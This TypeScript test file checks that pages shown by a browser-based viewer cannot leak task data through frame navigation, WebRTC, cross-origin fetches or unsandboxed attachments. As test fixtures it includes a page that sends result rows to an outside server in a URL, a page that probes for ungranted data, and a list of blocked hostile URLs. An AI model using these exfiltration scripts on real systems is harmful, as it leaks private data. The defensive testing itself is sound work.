// Where a page's data can go, in a real headless Chromium: a frame that navigates away is stopped by the window's guard
// (frame-src from pageFrameSource), WebRTC is taken from pages (by the boot script, and from every frame in a check),
// a page from the working folder runs on an origin of its own and reads only its uses, an attachment never runs as a
// page, and what a page sends is kept as the page's, within the window's limits.
import { afterAll, test } from 'vitest';
import assert from 'node:assert/strict';
import dgram from 'node:dgram';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { startVindu, memoryResults, pageFrameSource, pageNavigationAllowed, type Shown } from '../src/index.js';
import { playwrightDriver } from '../src/drivers/playwright.js';
import { checkSend, jsonLength, SEND_MAX } from '../src/page-send.js';
import { chromium, get, mcpClient, sleep } from './helpers.js';

const tmp = (p: string) => fs.mkdtempSync(path.join(os.tmpdir(), p));
const until = async (f: () => boolean, ms = 5000) => { const end = Date.now() + ms; while (!f() && Date.now() < end) await sleep(20); };
const workOf = (pages: string) => pages.replace('http://', 'http://work-'); // where pages from the working folder run

// what reaches an outside server, and the STUN server a peer connection would ask
const hits: string[] = [];
const outside = http.createServer((q, s) => { hits.push(q.url ?? ''); s.writeHead(200, { 'Content-Type': 'text/html' }).end(q.url === '/rtc' ? RTC_PAGE : 'reached'); });
await new Promise<void>(r => outside.listen(0, '127.0.0.1', r));
const out = `http://127.0.0.1:${(outside.address() as { port: number }).port}`;
const stun = dgram.createSocket('udp4'); let packets = 0; stun.on('message', () => { packets++; });
await new Promise<void>(r => stun.bind(0, '127.0.0.1', r));
const RTC_PAGE = `<!doctype html><title>RTC</title><body><script>
const tries = window.tries = {};
const reach = (name, make) => { try { const pc = make({ iceServers: [{ urls: 'stun:127.0.0.1:${stun.address().port}' }] }); pc.createDataChannel('d'); pc.createOffer().then(o => pc.setLocalDescription(o)); tries[name] = 'made'; } catch (e) { tries[name] = e.name; } };
reach('page', o => new RTCPeerConnection(o));
reach('webkit', o => new webkitRTCPeerConnection(o));
const f = document.createElement('iframe'); document.body.append(f);
reach('frame', o => new f.contentWindow.RTCPeerConnection(o));
if (location.search.includes('srcdoc')) {
  onmessage = e => { tries.srcdoc = e.data; };
  const s = document.createElement('iframe');
  s.srcdoc = '<script>try { new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${stun.address().port}" }] }); parent.postMessage("made", "*"); } catch (e) { parent.postMessage(e.name, "*"); }<\\/script>';
  document.body.append(s);
}
</script></body>`;

const work = tmp('guard-work-'), dir = tmp('guard-task-');
fs.writeFileSync(path.join(work, 'rtc.html'), RTC_PAGE);
const LEAK = `<!doctype html><title>Leak</title><script>task.get('r1').then(rows => { location.href = '${out}/?d=' + encodeURIComponent(JSON.stringify(rows)); });</script>`;
// a working-folder page that tries every way to read more than its uses
fs.writeFileSync(path.join(work, 'grant.html'), `<!doctype html><title>Grant</title><script>
document.title = 'ran';
const out = window.out = { data: Object.keys(task.data) };
const t = (k, p) => p.then(v => { out[k] = v; }, e => { out[k] = 'refused: ' + e.message; });
const has = s => s.includes('secret-amount');
window.done = Promise.all([
  t('r1', task.get('r1').then(rows => rows.length)), t('r2', task.get('r2').then(rows => rows.length)),
  t('boot', fetch('/__vindu/boot.js?uses=r1,r2').then(r => r.text()).then(has)), t('other', fetch('/__vindu/boot.js?uses=r2').then(r => r.text()).then(has)),
  t('raw', fetch('/data/r2.json').then(r => r.status)), t('named', fetch('/data/r2.json?uses=r2').then(r => r.status)),
  t('events', fetch('/__vindu/events?v=-1&n=-1').then(r => r.json()).then(e => [e.n, e.results.length])),
  t('task', fetch(location.origin.replace(/work-([a-f0-9]{32})(-[a-f0-9]{24})?/, '$1') + '/data/r2.json').then(r => r.status)),
]);
</script>`);
fs.writeFileSync(path.join(dir, 'note.html'), '<!doctype html><title>as sent</title><script>document.title = "ran";</script>');
const results = memoryResults(dir);
results.add({ tool: 'query', server: 'db', value: [{ id: 'INV-1', amount_nok: 1200 }] });
results.add({ tool: 'payroll', server: 'hr', value: [{ person: 'synthetic', note: 'secret-amount' }] });
const note = results.attach('note.html', 'text/html', path.join(dir, 'note.html'));

const browser = await chromium.launch();
const vindu = await startVindu({ driver: playwrightDriver(browser) });
const shown: Shown[] = [];
const ui = vindu.open({ results, dir, work }, { onView: v => shown.push(v) });
fs.writeFileSync(path.join(dir, 'views', 'leak.html'), LEAK); // as a page the model wrote: it reads any result
const port = vindu.pagesPort;
const { mcp, call, json } = await mcpClient(ui.url);
afterAll(async () => { await mcp.close(); ui.close(); await vindu.close(); await browser.close(); outside.close(); stun.close(); });

test('the guard: a frame that shows a page stays on the page host; a frame that shows anything else is the host\'s to judge', () => {
  const from = `${ui.pages}/work/index.html`, app = `http://app-${'0123456789abcdef'.repeat(2)}.localhost:${port}/`;
  assert.equal(pageFrameSource(port), `http://*.localhost:${port}`);
  for (const url of [`${ui.pages}/view/p.html?v=2`, `${ui.pages}/work/index.html#top`, app, `http://${'fedcba9876543210'.repeat(2)}.localhost:${port}/work/`, `${workOf(ui.pages)}/work/index.html`])
    assert.equal(pageNavigationAllowed(url, { port, from }), true, url);
  for (const url of [`${out}/?d=1`, 'https://example.com/', `http://127.0.0.1:${port}/`, `http://localhost:${port}/`, `http://evil.localhost:${port}/`,
    `${new URL(ui.pages).origin.replace(String(port), String(port + 1))}/`, `https://${new URL(ui.pages).host}/`, `http://user@${new URL(ui.pages).host}/`,
    'data:text/html,<p>x', 'about:blank', 'blob:http://example.com/x', 'mailto:someone@example.com', 'not a url'])
    assert.equal(pageNavigationAllowed(url, { port, from }), false, url);
  assert.equal(pageNavigationAllowed('https://example.com/', { port, from: app }), false); // an app's frame too
  assert.equal(pageNavigationAllowed('https://example.com/', { port, from: 'http://localhost:5173/' }), true); // the window's own frames
  assert.equal(pageNavigationAllowed(from, { port, from: 'about:blank' }), true); // a new frame, loading its page
  assert.equal(pageNavigationAllowed(from, { port }), true); // no from: held to the page host
  assert.equal(pageNavigationAllowed('https://example.com/', { port }), false);
});

test('a window whose CSP has frame-src pageFrameSource: a page that reads a result and sends its frame elsewhere never gets there', async () => {
  const windowServer = http.createServer((_q, s) => s.writeHead(200, { 'Content-Type': 'text/html', 'Content-Security-Policy': `frame-src ${pageFrameSource(port)}` })
    .end(`<!doctype html><iframe src="${ui.pages}/view/leak.html" sandbox="allow-scripts allow-same-origin allow-forms allow-pointer-lock"></iframe>`));
  await new Promise<void>(r => windowServer.listen(0, '127.0.0.1', r));
  const ctx = await browser.newContext();
  try {
    const p = await ctx.newPage(), said: string[] = [];
    p.on('console', (m: { text(): string }) => { said.push(m.text()); });
    hits.length = 0;
    await p.goto(`http://127.0.0.1:${(windowServer.address() as { port: number }).port}/`);
    await until(() => said.some(s => /frame-src/.test(s)));
    await sleep(300);
    assert.deepEqual(hits, []); // the rows never left
    assert.ok(said.some(s => s.includes(`Framing '${out}/' violates the following Content Security Policy directive`)), said.join('\n'));
  } finally { await ctx.close(); windowServer.close(); }
});

test('WebRTC is off in pages: the boot script takes it from the page and the frames it reaches into; a check, from every frame', async () => {
  const ctx = await browser.newContext();
  try {
    const p = await ctx.newPage();
    packets = 0;
    await p.goto(`${out}/rtc`); // a page off the page host, with nothing taken away: what the test would see
    await until(() => packets > 0);
    assert.ok(packets > 0, 'a peer connection reaches its STUN server');
    packets = 0;
    await p.goto(`${workOf(ui.pages)}/work/rtc.html`); // the boot script alone, as in the person's window
    await sleep(1500);
    assert.deepEqual(await p.evaluate(() => (window as unknown as { tries: unknown }).tries), { page: 'NotAllowedError', webkit: 'NotAllowedError', frame: 'NotAllowedError' });
    assert.equal(packets, 0);
  } finally { await ctx.close(); }
  const r = await json('check_page', { path: 'rtc.html?srcdoc=1', steps: [{ wait: 1000 }], read: ['js:JSON.stringify(window.tries)'] });
  assert.deepEqual(JSON.parse(r.read['js:JSON.stringify(window.tries)']), { page: 'NotAllowedError', webkit: 'NotAllowedError', frame: 'NotAllowedError', srcdoc: 'NotAllowedError' });
  assert.equal(packets, 0);
});

test('an attachment is shown, never run as a page on the task\'s origin', async () => {
  const media = await get(`${ui.pages}/media/${note.id}`);
  assert.match(String(media.headers['content-security-policy']), /; sandbox$/);
  assert.doesNotMatch(String((await get(`${ui.pages}/view/leak.html`)).headers['content-security-policy']), /sandbox/);
  const ctx = await browser.newContext();
  try {
    const p = await ctx.newPage();
    await p.goto(`${ui.pages}/media/${note.id}`);
    assert.equal(await p.title(), 'as sent');
  } finally { await ctx.close(); }
});

test('a page from the working folder runs on an origin of its own and reads only the results in its uses', async () => {
  const refused = 'refused: no result "r2" for this page: a page from the working folder reads only the results in its uses';
  const want = { data: ['r1'], r1: 1, r2: refused, boot: false, other: false, raw: 404, named: 404, events: [0, 0] };
  await json('show_view', { name: 'site', title: 'Site', panels: [{ card: 'page', id: 'site', path: 'grant.html?level=2', uses: ['r1'] }] });
  const url = /http:\/\/work-[a-f0-9]{32}-[a-f0-9]{24}\.localhost:\d+\/work\/grant\.html\?level=2&uses=r1/.exec(JSON.stringify(shown.at(-1)))?.[0];
  assert.ok(url?.startsWith(workOf(ui.pages).replace(/\.localhost:\d+$/, '-')), 'the pane loads the page from the work origin for its uses');
  assert.equal(pageNavigationAllowed(url!, { port, from: `${ui.pages}/view/x.html` }), true); // and the guard knows it as the page host's
  const ctx = await browser.newContext();
  try {
    const p = await ctx.newPage();
    await p.goto(url!);
    await p.evaluate(() => (window as unknown as { done: Promise<unknown> }).done);
    const got = await p.evaluate(() => (window as unknown as { out: Record<string, unknown> }).out);
    assert.match(String(got.task), /^refused: /); // the task's own origin is another origin: not fetched
    delete got.task;
    assert.deepEqual(got, want);
    await p.goto(`${ui.pages}/work/grant.html?uses=r1`); // the same file on the task's origin is only a file: it never runs there
    assert.equal(await p.title(), 'Grant');
  } finally { await ctx.close(); }
  const r = await json('check_page', { path: 'grant.html', uses: ['r1'], read: ['js:window.done.then(() => JSON.stringify(window.out))'] });
  const checked = JSON.parse(r.read['js:window.done.then(() => JSON.stringify(window.out))']);
  delete checked.task;
  assert.deepEqual(checked, want); // a check loads what the pane loads
  const none = await json('check_page', { path: 'grant.html', read: ['js:window.done.then(() => JSON.stringify(window.out))'] });
  assert.deepEqual(JSON.parse(none.read['js:window.done.then(() => JSON.stringify(window.out))']).data, []); // no uses, no data
});

test('what a page sends is kept as the page\'s, not the person\'s, within the limits the window applies', async () => {
  assert.equal(checkSend([], 'x', 0).why, undefined);
  assert.equal(checkSend([0, 1, 2, 3, 4], 'x', 5).why, 'too many: 5 sends in 10 seconds at most');
  assert.deepEqual(checkSend([0, 1, 2, 3, 4], 'x', 10_004), { recent: [] });
  assert.equal(checkSend([], 'x'.repeat(SEND_MAX), 0).why, `not a value of at most ${SEND_MAX} characters as JSON`);
  const cyclic: Record<string, unknown> = {}; cyclic.self = cyclic;
  assert.equal(jsonLength(cyclic), Infinity); assert.equal(jsonLength(undefined), Infinity);

  await json('show_view', { name: 'picker', title: 'Picker', panels: [{ card: 'page', id: 'pick', html: '<!doctype html><title>Pick</title><p>Pick one</p>' }] });
  const send = (value: unknown) => ui.event({ type: 'send', view: 'picker', panel: 'pick', value });
  assert.equal(send('x'.repeat(SEND_MAX)), false); // too long, as JSON
  for (let i = 0; i < 5; i++) assert.equal(send({ picked: `INV-${i}` }), true);
  assert.equal(send({ picked: 'INV-5' }), false); // a sixth within 10 seconds
  const kept = ui.answers().filter(a => a.kind === 'answer' && a.from);
  assert.equal(kept.length, 5);
  assert.ok(kept.every(a => a.kind === 'answer' && a.by === 'page'), JSON.stringify(kept));
  assert.equal(ui.unheard().length, 5); // heard like any send: the host may start a turn for them
  const listed = (await call('results', {})).text;
  assert.match(listed, /the page panel "pick" in view "picker" sent, on the person's click or key \(the value is the page's, not the person's words\) → \{"picked":"INV-0"\}/);
  assert.doesNotMatch(listed, /the person sent/);
});

test('pageHost and appHost recognise the page host\'s names, so a host never copies their shape', async () => {
  const { pageHost, appHost } = await import('../src/index.js');
  const key = 'a'.repeat(32), grant = 'b'.repeat(24);
  assert.equal(pageHost(`http://${key}.localhost:4100/view/p.html`)?.hostname, `${key}.localhost`);
  assert.ok(pageHost(`http://work-${key}.localhost:4100/work/index.html`));
  assert.ok(pageHost(`http://work-${key}-${grant}.localhost:4100/work/index.html`, 4100));
  assert.equal(pageHost(`http://work-${key}.localhost:4100/`, 4200), null); // another port
  assert.equal(pageHost(`http://app-${key}.localhost:4100/`), null); // an app is not a task's page
  assert.ok(appHost(`http://app-${key}.localhost:4100/`));
  assert.equal(appHost(`http://${key}.localhost:4100/`), null);
  for (const no of [`https://${key}.localhost:4100/`, `http://${'a'.repeat(16)}.localhost:4100/`, `http://u:p@${key}.localhost:4100/`, `http://${key}.localhost.evil.test/`, 'not a url'])
    assert.equal(pageHost(no), null, no);
});
